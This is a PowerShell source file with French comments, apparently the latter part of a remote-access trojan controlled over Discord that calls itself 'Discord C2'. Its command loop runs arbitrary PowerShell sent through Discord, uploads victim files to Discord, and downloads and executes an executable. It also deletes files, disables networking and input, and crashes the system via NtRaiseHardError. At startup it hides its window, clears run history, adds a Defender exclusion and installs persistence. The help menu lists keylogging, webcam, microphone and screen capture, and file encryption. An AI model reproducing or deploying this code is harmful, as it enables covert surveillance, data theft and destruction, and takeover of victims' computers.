        Write-DebugLog "Fichiers déchiffrés dans $Path"
    } catch {
        Write-DebugLog "Erreur lors du déchiffrement des fichiers : $_"
        Send-Error -ErrorMessage "Échec du déchiffrement des fichiers : $_" -Context "Decrypt-Files"
    }
}

# Suppression de fichiers
function Delete-Files {
    param([string]$Path)
    try {
        if (-not (Test-Path $Path -PathType Container)) {
            throw "Dossier introuvable : $Path"
        }
        Remove-Item -Path "$Path\*" -Force -Recurse -ErrorAction SilentlyContinue
        Send-Message -Embed @{
            "title" = "Fichiers supprimés"
            "description" = "Les fichiers dans le dossier spécifié ont été supprimés."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Dossier"; "value" = "$Path"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Fichiers supprimés dans $Path"
    } catch {
        Write-DebugLog "Erreur lors de la suppression des fichiers : $_"
        Send-Error -ErrorMessage "Échec de la suppression des fichiers : $_" -Context "Delete-Files"
    }
}

# Désactivation du réseau
function Disable-Network {
    try {
        Get-NetAdapter | Disable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue
        Send-Message -Embed @{
            "title" = "Réseau désactivé"
            "description" = "Tous les adaptateurs réseau ont été désactivés."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Réseau désactivé"
    } catch {
        Write-DebugLog "Erreur lors de la désactivation du réseau : $_"
        Send-Error -ErrorMessage "Échec de la désactivation du réseau : $_" -Context "Disable-Network"
    }
}

# Envoi d'Hydra
function Send-Hydra {
    try {
        $wc = New-Object System.Net.WebClient
        $Path = "$env:Temp\hydra.exe"
        $wc.DownloadFile("https://example.com/hydra.exe", $Path)
        Start-Process -FilePath $Path -NoNewWindow
        Send-Message -Embed @{
            "title" = "Hydra envoyé"
            "description" = "L'exécutable Hydra a été téléchargé et exécuté."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Hydra envoyé"
    } catch {
        Write-DebugLog "Erreur lors de l'envoi d'Hydra : $_"
        Send-Error -ErrorMessage "Échec de l'envoi d'Hydra : $_" -Context "Send-Hydra"
    }
}

# ------------------------- PRANKS -------------------------

# Mouvement aléatoire de la souris
function Start-RandomMouse {
    try {
        Start-Job -Name MouseJob -ScriptBlock {
            Add-Type -AssemblyName System.Windows.Forms
            while ($true) {
                $x = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)
                $y = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
                Start-Sleep -Milliseconds 500
            }
        }
        Write-DebugLog "Job de mouvement aléatoire de la souris démarré"
        Send-Message -Embed @{
            "title" = "Mouvement aléatoire de la souris démarré"
            "description" = "La souris se déplace aléatoirement sur l'écran."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage de RandomMouse : $_"
        Send-Error -ErrorMessage "Échec du démarrage de RandomMouse : $_" -Context "Start-RandomMouse"
    }
}

# Jouer un son
function Play-Sound {
    param([string]$Url)
    try {
        $Path = "$env:Temp\sound.mp3"
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($Url, $Path)
        Add-Type -AssemblyName presentationCore
        $player = New-Object System.Windows.Media.MediaPlayer
        $player.Open([uri]"file:///$Path")
        $player.Play()
        Start-Sleep -Seconds 10
        $player.Stop()
        Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
        Send-Message -Embed @{
            "title" = "Son joué"
            "description" = "Le son a été joué avec succès."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "URL"; "value" = "$Url"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Son joué depuis $Url"
    } catch {
        Write-DebugLog "Erreur lors de la lecture du son : $_"
        Send-Error -ErrorMessage "Échec de la lecture du son : $_" -Context "Play-Sound"
    }
}

# Faux BSOD
function Start-FakeBSOD {
    try {
        Add-Type -TypeDefinition @"
            using System.Runtime.InteropServices;
            public class BSOD {
                [DllImport("ntdll.dll")]
                public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
                [DllImport("ntdll.dll")]
                public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);
            }
"@
        $enabled = $false
        [BSOD]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled) | Out-Null
        $response = 0
        [BSOD]::NtRaiseHardError(0xC000021A, 0, 0, [IntPtr]::Zero, 6, [ref]$response) | Out-Null
        Write-DebugLog "Faux BSOD déclenché"
        Send-Message -Embed @{
            "title" = "Faux BSOD déclenché"
            "description" = "Un faux écran bleu a été affiché."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du déclenchement du faux BSOD : $_"
        Send-Error -ErrorMessage "Échec du déclenchement du faux BSOD : $_" -Context "Start-FakeBSOD"
    }
}

# Spam sonore
function Start-SoundSpam {
    try {
        Start-Job -Name SoundSpamJob -ScriptBlock {
            Add-Type -AssemblyName System.Windows.Forms
            while ($true) {
                [System.Windows.Forms.MessageBeep]::Play()
                Start-Sleep -Milliseconds 1000
            }
        }
        Write-DebugLog "Job de spam sonore démarré"
        Send-Message -Embed @{
            "title" = "Spam sonore démarré"
            "description" = "Des bips sonores sont joués en boucle."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage du spam sonore : $_"
        Send-Error -ErrorMessage "Échec du démarrage du spam sonore : $_" -Context "Start-SoundSpam"
    }
}

# ------------------------- VERROUILLAGE -------------------------

# Verrouillage de l'écran
function Lock-Screen {
    try {
        Add-Type -TypeDefinition @"
            using System.Runtime.InteropServices;
            public class Lock {
                [DllImport("user32.dll")]
                public static extern void LockWorkStation();
            }
"@
        [Lock]::LockWorkStation()
        Send-Message -Embed @{
            "title" = "Écran verrouillé"
            "description" = "L'écran a été verrouillé."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Écran verrouillé"
    } catch {
        Write-DebugLog "Erreur lors du verrouillage de l'écran : $_"
        Send-Error -ErrorMessage "Échec du verrouillage de l'écran : $_" -Context "Lock-Screen"
    }
}

# Désactivation des entrées
function Disable-Input {
    try {
        Add-Type -TypeDefinition @"
            using System.Runtime.InteropServices;
            public class Input {
                [DllImport("user32.dll")]
                public static extern bool BlockInput(bool fBlockIt);
            }
"@
        [Input]::BlockInput($true)
        Send-Message -Embed @{
            "title" = "Entrées désactivées"
            "description" = "Le clavier et la souris ont été désactivés."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Entrées désactivées"
    } catch {
        Write-DebugLog "Erreur lors de la désactivation des entrées : $_"
        Send-Error -ErrorMessage "Échec de la désactivation des entrées : $_" -Context "Disable-Input"
    }
}

# Déconnexion
function Logoff {
    try {
        shutdown /l
        Send-Message -Embed @{
            "title" = "Déconnexion effectuée"
            "description" = "L'utilisateur a été déconnecté."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Déconnexion effectuée"
    } catch {
        Write-DebugLog "Erreur lors de la déconnexion : $_"
        Send-Error -ErrorMessage "Échec de la déconnexion : $_" -Context "Logoff"
    }
}

# ------------------------- AUTRES -------------------------

# Exécution de commandes
function Execute-Command {
    param([string]$Command)
    try {
        $output = Invoke-Expression $Command -ErrorAction SilentlyContinue | Out-String
        Send-Message -Embed @{
            "title" = "Commande exécutée"
            "description" = "```$output```"
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Commande"; "value" = "$Command"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Commande exécutée : $Command"
    } catch {
        Write-DebugLog "Erreur lors de l'exécution de la commande : $_"
        Send-Error -ErrorMessage "Échec de l'exécution de la commande : $_" -Context "Execute-Command"
    }
}

# Téléversement de fichier
function Upload-File {
    param([string]$Path)
    try {
        if (-not (Test-Path $Path -PathType Leaf)) {
            throw "Fichier introuvable : $Path"
        }
        Send-File -FilePath $Path
        Write-DebugLog "Fichier téléversé : $Path"
    } catch {
        Write-DebugLog "Erreur lors du téléversement du fichier : $_"
        Send-Error -ErrorMessage "Échec du téléversement du fichier : $_" -Context "Upload-File"
    }
}

# Téléchargement de fichier
function Download-File {
    param([string]$Url, [string]$Path)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($Url, $Path)
        Send-Message -Embed @{
            "title" = "Fichier téléchargé"
            "description" = "Le fichier a été téléchargé avec succès."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "URL"; "value" = "$Url"; "inline" = $true }
                @{ "name" = "Chemin"; "value" = "$Path"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Fichier téléchargé : $Url vers $Path"
    } catch {
        Write-DebugLog "Erreur lors du téléchargement du fichier : $_"
        Send-Error -ErrorMessage "Échec du téléchargement du fichier : $_" -Context "Download-File"
    }
}

# Statut des jobs
function Get-Status {
    try {
        $jobs = Get-Job | Where-Object { $_.Name -in @("ScreenJob", "CamJob", "MicJob", "KeyJob", "MouseJob", "SoundSpamJob") }
        $fields = $jobs | ForEach-Object {
            @{ "name" = "$($_.Name)"; "value" = "État: $($_.State)"; "inline" = $true }
        }
        Send-Message -Embed @{
            "title" = "Statut des jobs"
            "description" = "Liste des jobs actifs."
            "color" = 0x00FFFF
            "fields" = $fields
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Statut des jobs envoyé"
    } catch {
        Write-DebugLog "Erreur lors de la récupération du statut : $_"
        Send-Error -ErrorMessage "Échec de la récupération du statut : $_" -Context "Get-Status"
    }
}

# Vérification de la version
function Get-VersionCheck {
    try {
        Send-Message -Embed @{
            "title" = "Vérification de la version"
            "description" = "Version actuelle : $version"
            "color" = 0x00FFFF
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Version vérifiée : $version"
    } catch {
        Write-DebugLog "Erreur lors de la vérification de la version : $_"
        Send-Error -ErrorMessage "Échec de la vérification de la version : $_" -Context "Get-VersionCheck"
    }
}

# Liste des commandes
function Get-Help {
    try {
        $commands = @(
            @{ "name" = "!screenjob"; "description" = "Démarre la capture d'écran"; "danger" = "Moyen"; "visibility" = "Visible" }
            @{ "name" = "!camjob"; "description" = "Démarre la capture webcam"; "danger" = "Moyen"; "visibility" = "Visible" }
            @{ "name" = "!micjob"; "description" = "Démarre l'enregistrement audio"; "danger" = "Moyen"; "visibility" = "Visible" }
            @{ "name" = "!keyjob"; "description" = "Démarre le keylogger"; "danger" = "Élevé"; "visibility" = "Caché" }
            @{ "name" = "!system-info"; "description" = "Collecte les informations système"; "danger" = "Faible"; "visibility" = "Caché" }
            @{ "name" = "!running-processes"; "description" = "Liste les processus en cours"; "danger" = "Faible"; "visibility" = "Caché" }
            @{ "name" = "!network-info"; "description" = "Collecte les informations réseau"; "danger" = "Faible"; "visibility" = "Caché" }
            @{ "name" = "!nearbywifi"; "description" = "Liste les réseaux Wi-Fi à proximité"; "danger" = "Faible"; "visibility" = "Caché" }
            @{ "name" = "!encrypt-files <path>"; "description" = "Chiffre les fichiers dans le dossier"; "danger" = "Élevé"; "visibility" = "Caché" }
            @{ "name" = "!decrypt-files <path>"; "description" = "Déchiffre les fichiers dans le dossier"; "danger" = "Moyen"; "visibility" = "Caché" }
            @{ "name" = "!delete-files <path>"; "description" = "Supprime les fichiers dans le dossier"; "danger" = "Élevé"; "visibility" = "Caché" }
            @{ "name" = "!disable-network"; "description" = "Désactive les adaptateurs réseau"; "danger" = "Élevé"; "visibility" = "Visible" }
            @{ "name" = "!sendhydra"; "description" = "Télécharge et exécute Hydra"; "danger" = "Élevé"; "visibility" = "Caché" }
            @{ "name" = "!random-mouse"; "description" = "Déplace la souris aléatoirement"; "danger" = "Moyen"; "visibility" = "Visible" }
            @{ "name" = "!play-sound <url>"; "description" = "Joue un son depuis une URL"; "danger" = "Faible"; "visibility" = "Visible" }
            @{ "name" = "!fake-bsod"; "description" = "Déclenche un faux BSOD"; "danger" = "Élevé"; "visibility" = "Visible" }
            @{ "name" = "!soundspam"; "description" = "Joue des bips sonores en boucle"; "danger" = "Moyen"; "visibility" = "Visible" }
            @{ "name" = "!lock-screen"; "description" = "Verrouille l'écran"; "danger" = "Moyen"; "visibility" = "Visible" }
            @{ "name" = "!disable-input"; "description" = "Désactive le clavier et la souris"; "danger" = "Élevé"; "visibility" = "Visible" }
            @{ "name" = "!logoff"; "description" = "Déconnecte l'utilisateur"; "danger" = "Élevé"; "visibility" = "Visible" }
            @{ "name" = "!execute <command>"; "description" = "Exécute une commande PowerShell"; "danger" = "Élevé"; "visibility" = "Caché" }
            @{ "name" = "!upload-file <path>"; "description" = "Téléverse un fichier vers Discord"; "danger" = "Moyen"; "visibility" = "Caché" }
            @{ "name" = "!download-file <url> <path>"; "description" = "Télécharge un fichier depuis une URL"; "danger" = "Moyen"; "visibility" = "Caché" }
            @{ "name" = "!status"; "description" = "Affiche le statut des jobs"; "danger" = "Faible"; "visibility" = "Caché" }
            @{ "name" = "!versioncheck"; "description" = "Vérifie la version du script"; "danger" = "Faible"; "visibility" = "Caché" }
            @{ "name" = "!close"; "description" = "Arrête le script et nettoie"; "danger" = "Faible"; "visibility" = "Caché" }
            @{ "name" = "!add-persistence"; "description" = "Ajoute la persistance au démarrage"; "danger" = "Élevé"; "visibility" = "Caché" }
        )
        $fields = $commands | ForEach-Object {
            @{ "name" = $_.name; "value" = "Description: $($_.description)\nDanger: $($_.danger)\nVisibilité: $($_.visibility)"; "inline" = $true }
        }
        Send-Message -Embed @{
            "title" = "Liste des commandes"
            "description" = "Commandes disponibles pour Discord C2."
            "color" = 0x00FFFF
            "fields" = $fields
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Liste des commandes envoyée"
    } catch {
        Write-DebugLog "Erreur lors de l'envoi de la liste des commandes : $_"
        Send-Error -ErrorMessage "Échec de l'envoi de la liste des commandes : $_" -Context "Get-Help"
    }
}

# Arrêt du script
function Close-Script {
    try {
        Get-Job | Stop-Job -ErrorAction SilentlyContinue
        Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:Temp\*" -Include "Screen.jpg", "Cam.jpg", "mic.wav", "c2_key.txt", "c2_category.txt", "ffmpeg.exe" -Force -ErrorAction SilentlyContinue
        Remove-DefenderExclusion
        Remove-Persistence
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json")
        $body = @{} | ConvertTo-Json
        $wc.UploadString("https://discord.com/api/v10/channels/$global:SessionID", "DELETE", $body) | Out-Null
        $wc.UploadString("https://discord.com/api/v10/channels/$global:CategoryID", "DELETE", $body) | Out-Null
        Send-Message -Embed @{
            "title" = "Script arrêté"
            "description" = "Tous les jobs ont été arrêtés, les fichiers temporaires et la catégorie Discord ont été supprimés."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Script arrêté et nettoyé"
        exit
    } catch {
        Write-DebugLog "Erreur lors de l'arrêt du script : $_"
        Send-Error -ErrorMessage "Échec de l'arrêt du script : $_" -Context "Close-Script"
    }
}

# ------------------------- BOUCLE PRINCIPALE -------------------------

function Main {
    try {
        Hide-Window
        Clear-RunHistory
        Add-DefenderExclusion
        Add-Persistence # Ajouter la persistance au démarrage
        if ($spawnChannels -eq 1) {
            New-ChannelCategory
            New-Channel -name "session"
            $global:SessionID = $global:ChannelID
            New-Channel -name "screen"
            $global:ScreenJobID = $global:ChannelID
            New-Channel -name "webcam"
            $global:CamJobID = $global:ChannelID
            New-Channel -name "microphone"
            $global:MicJobID = $global:ChannelID
            New-Channel -name "keylogger"
            $global:KeyJobID = $global:ChannelID
        }
        if ($InfoOnConnect -eq 1) {
            Get-SystemInfo
        }
        if ($defaultstart -eq 1) {
            Start-ScreenJob
            Start-CamJob
            Start-AudioJob
            Start-KeyJob
        }
        Send-Message -Embed @{
            "title" = "Bot connecté"
            "description" = "Le bot C2 est connecté et prêt à recevoir des commandes."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Nom de l'ordinateur"; "value" = "$env:COMPUTERNAME"; "inline" = $true }
                @{ "name" = "Version"; "value" = "$version"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        while ($true) {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $token")
            $response = $wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages?limit=1")
            $messages = ConvertFrom-Json $response
            if ($messages) {
                $msg = $messages[0].content
                if ($msg -and $messages[0].author.bot -ne $true) {
                    Write-DebugLog "Message reçu : $msg"
                    switch -Regex ($msg) {
                        "^!screenjob$" { Start-ScreenJob }
                        "^!camjob$" { Start-CamJob }
                        "^!micjob$" { Start-AudioJob }
                        "^!keyjob$" { Start-KeyJob }
                        "^!system-info$" { Get-SystemInfo }
                        "^!running-processes$" { Get-RunningProcesses }
                        "^!network-info$" { Get-NetworkInfo }
                        "^!nearbywifi$" { Get-NearbyWifi }
                        "^!encrypt-files\s+(.+)$" { Encrypt-Files -Path $matches[1] }
                        "^!decrypt-files\s+(.+)$" { Decrypt-Files -Path $matches[1] }
                        "^!delete-files\s+(.+)$" { Delete-Files -Path $matches[1] }
                        "^!disable-network$" { Disable-Network }
                        "^!sendhydra$" { Send-Hydra }
                        "^!random-mouse$" { Start-RandomMouse }
                        "^!play-sound\s+(.+)$" { Play-Sound -Url $matches[1] }
                        "^!fake-bsod$" { Start-FakeBSOD }
                        "^!soundspam$" { Start-SoundSpam }
                        "^!lock-screen$" { Lock-Screen }
                        "^!disable-input$" { Disable-Input }
                        "^!logoff$" { Logoff }
                        "^!execute\s+(.+)$" { Execute-Command -Command $matches[1] }
                        "^!upload-file\s+(.+)$" { Upload-File -Path $matches[1] }
                        "^!download-file\s+(.+)\s+(.+)$" { Download-File -Url $matches[1] -Path $matches[2] }
                        "^!status$" { Get-Status }
                        "^!versioncheck$" { Get-VersionCheck }
                        "^!help$" { Get-Help }
                        "^!add-persistence$" { Add-Persistence }
                        "^!close$" { Close-Script }
                        default { 
                            Send-Message -Embed @{
                                "title" = "Commande inconnue"
                                "description" = "Utilisez !help pour voir la liste des commandes."
                                "color" = 0xFF0000
                                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
                            }
                        }
                    }
                    $wc.UploadString("https://discord.com/api/v10/channels/$global:SessionID/messages/$($messages[0].id)", "DELETE", "{}") | Out-Null
                }
            }
            Start-Sleep -Seconds 5
        }
    } catch {
        Write-DebugLog "Erreur dans la boucle principale : $_"
        Send-Error -ErrorMessage "Erreur dans la boucle principale : $_" -Context "Main"
    }
}

# Démarrage du script
Main
